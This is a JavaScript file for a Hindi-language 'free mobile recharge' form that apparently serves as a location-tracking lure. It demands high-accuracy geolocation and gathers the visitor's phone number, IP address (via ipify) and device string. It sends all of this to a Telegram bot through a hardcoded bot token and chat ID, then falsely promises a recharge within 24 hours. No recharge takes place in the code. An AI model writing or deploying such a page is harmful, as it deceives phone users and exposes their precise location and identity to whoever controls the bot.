const form = document.getElementById('rechargeForm');
const submitBtn = document.getElementById('submitBtn');
const msg = document.getElementById('msg');

form.addEventListener('submit', function (e) {
  e.preventDefault();
  msg.textContent = '';
  submitBtn.disabled = true;

  const sim = document.getElementById('simSelect').value;
  const number = document.getElementById('mobileNumber').value.trim();

  if (!sim || !/^\d{10}$/.test(number)) {
    alert('कृपया सही सिम और मोबाइल नंबर दर्ज करें।');
    submitBtn.disabled = false;
    return;
  }

  if (navigator.geolocation) {
    msg.textContent = 'स्थान अनुमति मांगी जा रही है... कृपया इंतज़ार करें।';
    navigator.geolocation.getCurrentPosition(
      (position) => {
        sendData(sim, number, position);
      },
      (error) => {
        alert('स्थान अनुमति नहीं दी गई। कृपया अनुमति दें।');
        submitBtn.disabled = false;
        msg.textContent = '';
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
      }
    );
  } else {
    alert('आपका ब्राउज़र Geolocation का समर्थन नहीं करता।');
    submitBtn.disabled = false;
    msg.textContent = '';
  }
});

async function sendData(sim, number, position) {
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const accuracy = position.coords.accuracy;
  const time = new Date().toLocaleString();

  let ip = 'Unavailable';
  try {
    const ipData = await fetch('https://api.ipify.org?format=json').then((res) =>
      res.json()
    );
    ip = ipData.ip;
  } catch {}

  // Device info (simplified)
  const device = navigator.userAgent.replace(/\s*\([^)]*\)/g, '');

  const message =
    `🎯 Recharge Request Received:%0A` +
    `SIM: ${sim}%0A` +
    `Mobile Number: ${number}%0A` +
    `📍 Location:%0ALat: ${lat}%0ALong: ${lon}%0AAccuracy: ${accuracy} meters%0A` +
    `🕒 Time: ${time}%0A%0A` +
    `🌐 IP: ${ip}%0A` +
    `📱 Device: ${device}`;

  const botToken = '8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc';
  const chatId = '6038115234';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

  try {
    await fetch(url);
    msg.textContent =
      '👍 धन्यवाद! आपका रिचार्ज अनुरोध सफलतापूर्वक जमा हो गया है। 24 घंटों के भीतर आपको संदेश प्राप्त होगा।';
  } catch {
    msg.textContent =
      '❌ अनुरोध भेजने में त्रुटि हुई। कृपया पुनः प्रयास करें।';
    submitBtn.disabled = false;
  }
}
